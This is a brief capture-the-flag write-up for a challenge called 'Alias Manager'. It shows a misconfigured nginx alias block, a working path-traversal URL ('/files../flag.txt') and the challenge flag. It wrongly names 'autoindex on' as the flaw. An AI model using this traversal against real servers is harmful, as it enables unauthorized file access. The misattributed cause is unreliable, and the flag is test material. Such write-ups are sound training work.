# Alias Manager

A private file storage service is under development, but
something seems off with its configuration. Can you retrieve
the flag.txt file hidden outside the intended directory?
Sometimes, what you see isn't the full picture ...

https://qwertyuiopas-csc26.cybersecuritychallenge.al

### Soulution

```nginx
...
        location /files {
            alias /var/www/uploads/;
            autoindex on; -> The problem
        }
...
```

https://mxvhtklojp-ctf.cybersecuritychallenge.al/files../flag.txt

### Flag

`CSC26{4l14s_m4n4g3r_c0nf1g}`
